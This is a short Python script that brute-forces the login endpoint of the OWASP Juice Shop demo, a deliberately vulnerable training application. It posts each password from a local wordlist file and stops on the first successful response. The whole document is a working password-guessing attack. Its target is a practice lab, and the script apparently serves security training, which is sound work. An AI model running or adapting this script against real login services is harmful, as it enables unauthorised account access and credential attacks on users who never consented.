import requests

url = 'https://demo.owasp-juice.shop/rest/user/login'
cookies = dict(language='en', cookieconsent_status='dismiss', io='')
email = ''
pwdfile = 'data.txt'

with open(pwdfile) as fp:
	for index, pwd in enumerate(fp):
		payload = {"email":email,"password":pwd.replace('\n', '')}
		r = requests.post(url, data=payload, cookies=cookies)
		print("{}: {}".format(str(payload), r.status_code))
		if r.status_code == 200:
			print("Succesfull login: " + pwd)
			fp.close()
			exit()

print("No succesfull login found!")